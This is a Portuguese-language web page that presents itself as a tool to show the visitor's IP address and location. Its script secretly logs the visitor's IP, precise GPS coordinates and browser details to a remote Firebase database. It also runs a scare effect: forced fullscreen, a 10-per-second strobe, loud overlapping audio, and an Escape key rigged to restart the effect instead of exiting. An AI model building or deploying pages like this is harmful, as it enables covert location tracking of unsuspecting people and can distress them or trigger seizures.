<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Abrir</title>
<link rel="icon" href="data:,">

<style>
* { box-sizing: border-box; }

body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #111;
  color: white;
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  overflow: hidden;
}

#startScreen, #effectScreen {
  position: fixed;
  inset: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
}

#startScreen {
  background: linear-gradient(180deg, #111, #000);
  gap: 16px;
  text-align: center;
  padding: 24px;
}

button {
  padding: 14px 28px;
  font-size: 18px;
  border: none;
  border-radius: 10px;
  cursor: pointer;
}

#openBtn {
  background: white;
  color: black;
  font-weight: bold;
}

#effectScreen {
  display: none;
  background: black;
  transition: filter 0.2s ease;
}

.invert {
  filter: invert(1);
}

.glitch {
  font-size: 56px;
  font-weight: bold;
  letter-spacing: 4px;
  animation: shake 0.18s infinite;
  text-shadow: 2px 0 red, -2px 0 cyan;
  user-select: none;
  text-align: center;
  padding: 20px;
  max-width: 90vw;
  word-break: break-word;
}

.overlay {
  position: absolute;
  inset: 0;
  pointer-events: none;
  background:
    repeating-linear-gradient(
      to bottom,
      rgba(255,255,255,0.03) 0px,
      rgba(255,255,255,0.03) 2px,
      transparent 2px,
      transparent 4px
    );
  animation: drift 6s linear infinite;
}

.exitHint {
  position: absolute;
  bottom: 20px;
  font-size: 14px;
  opacity: 0.8;
  text-align: center;
  padding: 0 16px;
  max-width: 90vw;
}

@keyframes shake {
  0% { transform: translate(0, 0); }
  25% { transform: translate(1px, -1px); }
  50% { transform: translate(-1px, 1px); }
  75% { transform: translate(1px, 1px); }
  100% { transform: translate(0, 0); }
}

@keyframes drift {
  from { transform: translateY(0); }
  to { transform: translateY(8px); }
}
</style>
</head>

<body>

<div id="startScreen">
  <h1>Mostrar IP e localização</h1>
  <p>Ao clicar, será pedido acesso à localização.</p>
  <button id="openBtn">Abrir</button>
</div>

<div id="effectScreen">
  <div class="overlay"></div>
  <div class="glitch" id="text">PREPARING...</div>
  <div class="exitHint" id="locationText">A pedir IP e localização...</div>

  <audio id="audio1" preload="auto" src="1.mp3"></audio>
  <audio id="audio2" preload="auto" src="2.mp3"></audio>
  <audio id="audio3" preload="auto" src="3.mp3"></audio>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

/* SUBSTITUI PELOS DADOS DO TEU FIREBASE */
    const firebaseConfig = {
      apiKey: "AIzaSyCrF-J4HWzpHcws_RdFSsHDrYQqgMJKgvE",
      authDomain: "content-729f5.firebaseapp.com",
      projectId: "content-729f5",
      storageBucket: "content-729f5.firebasestorage.app",
      messagingSenderId: "541149104135",
      appId: "1:541149104135:web:25b1bd0d8e31f2bb64c2a2"
    };

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const openBtn = document.getElementById("openBtn");
const startScreen = document.getElementById("startScreen");
const effectScreen = document.getElementById("effectScreen");
const text = document.getElementById("text");
const locationText = document.getElementById("locationText");

const audio1 = document.getElementById("audio1");
const audio2 = document.getElementById("audio2");
const audio3 = document.getElementById("audio3");

let invertInterval = null;
let cachedIP = "UNKNOWN";
let effectStarted = false;
let lastClickTime = null;

/* Buscar IP logo ao carregar */
async function preloadIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    cachedIP = data.ip || "UNKNOWN";
    if (effectStarted) {
      text.textContent = cachedIP;
    }
    console.log("IP carregado:", cachedIP);
  } catch (error) {
    cachedIP = "ERROR";
    if (effectStarted) {
      text.textContent = cachedIP;
    }
    console.error("Erro ao obter IP:", error);
  }
}

preloadIP();

async function enterFullscreen() {
  const el = document.documentElement;
  if (el.requestFullscreen && !document.fullscreenElement) {
    await el.requestFullscreen();
  }
}

function startInvertEffect() {
  if (invertInterval) return;

  let state = false;
  invertInterval = setInterval(() => {
    state = !state;
    effectScreen.classList.toggle("invert", state);
  }, 100);
}

function stopInvertEffect() {
  clearInterval(invertInterval);
  invertInterval = null;
  effectScreen.classList.remove("invert");
}

function stopAllAudio() {
  [audio1, audio2, audio3].forEach(audio => {
    audio.pause();
    audio.currentTime = 0;
  });
}

async function saveToFirestore(payload) {
  console.log("Vou guardar no Firestore:", payload);

  try {
    const docRef = await addDoc(collection(db, "logs"), {
      ...payload,
      createdAt: serverTimestamp()
    });

    console.log("Guardado com sucesso. ID:", docRef.id);

    locationText.textContent =
      `Guardado às ${payload.clickedAtLocal} | IP ${payload.ip}`;
  } catch (error) {
    console.error("Erro ao guardar no Firestore:", error);
    locationText.textContent = "Erro ao guardar no Firebase: " + error.message;
  }
}

function requestLocationAndSave() {
  if (!navigator.geolocation) {
    locationText.textContent = "Geolocalização não suportada neste browser.";
    console.log("Geolocalização não suportada.");
    return;
  }

  locationText.textContent = "A pedir permissão de localização...";
  console.log("A pedir localização...");

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      console.log("Localização recebida:", position);

      const clickDate = lastClickTime || new Date();

      const payload = {
        ip: cachedIP,
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        userAgent: navigator.userAgent,
        clickedAtISO: clickDate.toISOString(),
        clickedAtLocal: clickDate.toLocaleString("pt-PT")
      };

      console.log("Payload:", payload);
      await saveToFirestore(payload);

      text.textContent = cachedIP;
    },
    (error) => {
      console.error("Erro ao obter localização:", error);

      switch (error.code) {
        case error.PERMISSION_DENIED:
          locationText.textContent = "Permissão de localização negada.";
          break;
        case error.POSITION_UNAVAILABLE:
          locationText.textContent = "Localização indisponível.";
          break;
        case error.TIMEOUT:
          locationText.textContent = "Tempo de espera excedido.";
          break;
        default:
          locationText.textContent = "Erro ao obter localização.";
      }
    },
    {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    }
  );
}

async function startEffect() {
  if (effectStarted) return;
  effectStarted = true;
  lastClickTime = new Date();

  try {
    await enterFullscreen();
  } catch (e) {
    console.warn("Não foi possível entrar em fullscreen:", e);
  }

  startScreen.style.display = "none";
  effectScreen.style.display = "flex";

  startInvertEffect();
  text.textContent = cachedIP;
  locationText.textContent = "A pedir IP e localização...";

  audio1.volume = 1;
  audio2.volume = 1;
  audio3.volume = 1;

  audio1.play().catch(() => {});
  setTimeout(() => audio2.play().catch(() => {}), 100);
  setTimeout(() => audio3.play().catch(() => {}), 200);

  requestLocationAndSave();
}

openBtn.addEventListener("click", startEffect);

document.addEventListener("keydown", async (e) => {
  if (e.key === "Escape") {
    stopInvertEffect();
    stopAllAudio();

    effectStarted = false;
    lastClickTime = new Date();

    try {
      await enterFullscreen();
    } catch (err) {}

    setTimeout(() => {
      startEffect();
    }, 50);
  }
});
</script>

</body>
</html>
